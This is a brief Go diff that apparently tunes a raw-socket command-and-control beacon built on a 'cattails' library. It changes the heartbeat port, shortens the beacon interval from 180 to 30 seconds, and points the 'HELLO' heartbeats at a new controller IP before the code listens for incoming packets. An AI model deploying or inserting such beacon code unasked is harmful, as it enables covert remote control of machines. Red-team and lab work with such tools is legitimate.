@@ -47,12 +47,12 @@ func generateHeartbeat(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.
 		data = rawsocket.AddIdentifier(data, true)
 
 		// Send Packet
-		packet := cattails.CreatePacket(iface, src, dst, 18000, 58000, dstMAC, data)
+		packet := cattails.CreatePacket(iface, src, dst, 18000, 56969, dstMAC, data)
 		addr := cattails.CreateAddrStruct(iface)
 		cattails.SendPacket(fd, iface, addr, packet)
 
 		fmt.Println("[+] Sent HELLO")
-		time.Sleep(180 * time.Second)
+		time.Sleep(30 * time.Second)
 	}
 }
 
@@ -111,7 +111,7 @@ func main() {
 	fmt.Println("[+] Socket created")
 
 	// Get information that is needed for networking
-	iface, src := cattails.GetOutwardIface("192.168.1.174:8000")
+	iface, src := cattails.GetOutwardIface("192.168.1.202:8000")
 
 	dstMAC, err := cattails.GetRouterMAC()
 	if err != nil {
@@ -120,7 +120,7 @@ func main() {
 	fmt.Println("[+] DST MAC:", dstMAC.String())
 	fmt.Println("[+] Listening")
 
-	go generateHeartbeat(iface, src, net.IPv4(192, 168, 1, 174), dstMAC)
+	go generateHeartbeat(iface, src, net.IPv4(192, 168, 1, 202), dstMAC)
 
 	for {
 		packet := rawsocket.BothReadPacket(readfd, vm, false)
